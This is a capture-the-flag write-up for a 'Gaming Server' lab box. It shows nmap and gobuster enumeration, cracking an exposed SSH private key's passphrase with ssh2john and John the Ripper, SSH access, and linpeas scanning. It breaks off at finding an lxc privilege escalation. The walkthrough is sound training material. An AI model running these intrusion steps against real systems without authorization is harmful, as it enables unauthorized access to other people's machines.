## Nmap: 
---
```bash
 nmap -T4 -n -A 10.66.143.249 -oN nmap
```

```bash 
Nmap scan report for 10.66.143.249
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- so we see that a web-server is running and `SSH` is open 
- lets open up the website 
## further Enumeration:
---
![](Gaming%20Server/images/Gaming_Server_1.png)
- lets check out the `source-code` (press Ctrl+U), because the content of the page is mostly `Lorem ipsum` 
- at the end of the `HTML`-file we see this comment: 
```bash
<!-- <Redacted>, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```
- so we found a potential `username` 
- lets use `Gobuster` to scan the website to find more directory's or files 
### Gobuster: 
---
```bash
gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/common.txt -u http://10.66.143.249 -o gobuster/first_enum
```

```bash
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 2762]
/robots.txt           (Status: 200) [Size: 33]
/secret               (Status: 301) [Size: 315] [--> http://10.66.143.249/secret/]
/server-status        (Status: 403) [Size: 278]
/uploads              (Status: 301) [Size: 316] [--> http://10.66.143.249/uploads/]
```
- `Gobuster` did find the directory `uploads` and `secret` 
- in `/uploads` was a `dict.lst` file that looked like a wordlist, that we could maybe use to brute-force the password for the user we found 
- in `/secret` was a `private-key`, so maybe we have to use the wordlist to crack the passphrase for that `private-key` 
- lets do this with `John the Ripper` 
## John the Ripper: 
---
- I downloaded the `dict.lst` and the `private-key` 
- first we have to convert the private-key into a format that john can understand, we can do this with `ssh2john`: 
```bash
python3 ssh2john.py secretKey > hash.txt
```

- after that we can try to crack the `hash` with regular `john`: 
```bash
john --wordlist=dict.lst hash.txt
```

- to show the cracked passphrase we can run: 
```bash
john hash.txt --show
```

```bash
secretKey:<Redacted>

1 password hash cracked, 0 left
```

- now we can login into the user with `SSH`: 
```bash
ssh -i secretKey <Redacted>@10.65.147.100
```

## Privilege Escalation: 
---
- now we can read the `user.txt`: 
```bash
a<Redacted>e 
```

- after that i looked through different directory's to find something we could use to escalate our privileges, but I didn't find anything 
- then I used the `linpeas.sh` to scan the whole system and found that the user had a `lxc`-config in his `.config` 
- so i searched for a `lxc` exploit and found one 